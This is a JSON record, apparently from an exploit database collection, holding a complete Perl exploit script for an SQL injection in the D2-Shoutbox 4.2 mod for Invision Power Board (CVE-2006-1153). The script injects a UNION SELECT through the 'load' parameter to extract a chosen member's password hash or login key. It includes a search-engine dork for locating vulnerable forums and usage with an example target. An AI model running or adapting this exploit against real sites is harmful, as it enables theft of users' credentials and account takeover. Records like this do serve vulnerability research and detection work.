{
  "id": "1556",
  "title": "D2-Shoutbox 4.2 IPB Mod - &#039;load&#039; SQL Injection",
  "cve": "CVE-2006-1153",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#########################################################\r\n#\t\t _______ _______ ______ \t\t#\r\n#\t\t |______ |______ |     \\\t\t#\r\n#\t\t ______| |______ |_____/\t\t#\r\n#\t\t                        \t\t#\r\n#D2-Shoutbox 4.2(IPB Mod)<=SQL injection\t\t#\r\n#Created By SkOd                                        #\r\n#SED security Team                                      #\r\n#http://www.sed-team.be                                 #\r\n#skod.uk@gmail.com                                      #\r\n#ISRAEL                                                 #\r\n#########################################################\r\n#google:\r\n#\"Powered By D2-Shoutbox 4.2\"\r\n#########################################################\r\nuse IO::Socket;\r\n$host = $ARGV[0];\r\n$user = $ARGV[2];\r\n$uid  = $ARGV[3];\r\n$pid  = $ARGV[4];\r\n$type = $ARGV[5];\r\n\r\nsub type()\r\n{\r\nif($type==1){$row=\"password\";}\r\nif($type==2){$row=\"member_login_key\";}\r\nelse{print \"Just 1 Or 2\\n\";exit();}\r\n$sql=\"index.php?act=Shoutbox&view=saved&load=-1%20UNION%20SELECT%20null,null,null,null,\".$row.\",null,null,null%20FROM%20ibf_members%20where%20id=\".$user.\"/*\";\r\n$path = $ARGV[1].$sql;\r\n}\r\n\r\n\r\nsub header()\r\n{\r\nprint q{\r\n#######################################################################\r\n###\t\t D2-Shoutbox 4.2 SQL injection Exploit \t    \t    ### \r\n###\t\t Tested On D2-Shoutbox 4.2 And IPB 2.4 \t    \t    ###\r\n###\t\t  Created By SkOd, Sed Security Team \t    \t    ###\r\n#######################################################################\r\nsedSB.pl [HOST] [DIR] [victim] [my id] [my md5 hash] [1-(1.*)/2-(2.*)]\r\nsedSB.pl www.host.com /forum/ 2 4500 f3b8a336b250ee595dc6ef6bac38b647 2\r\n#######################################################################\r\n}\r\n}\r\n\r\nsub sedsock()\r\n{\r\n$sedsock = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => $host, PeerPort => \"80\") || die \"[-]Connect Failed\\r\\n\";\r\nprint $sedsock \"GET $path HTTP/1.1\\n\";\r\nprint $sedsock \"Host: $host\\n\";\r\nprint $sedsock \"Accept: */*\\n\";\r\nprint $sedsock \"Cookie: member_id=$uid; pass_hash=$pid\\n\";\r\nprint $sedsock \"Connection: close\\n\\n\";\r\nwhile($res = <$sedsock>){\r\n$res =~ m/shout_s'>(.*?)<\\/textarea>/ && print \"[+]User: $user\\n[+]Md5 Hash: $1\\n\";\r\n}\r\n}\r\n\r\nif(@ARGV < 6){\r\nheader();\r\n}else{\r\ntype();\r\nsedsock();\r\n}\r\n\r\n# milw0rm.com [2006-03-06]",
  "url": "https://www.exploit-db.com/exploits/1556"
}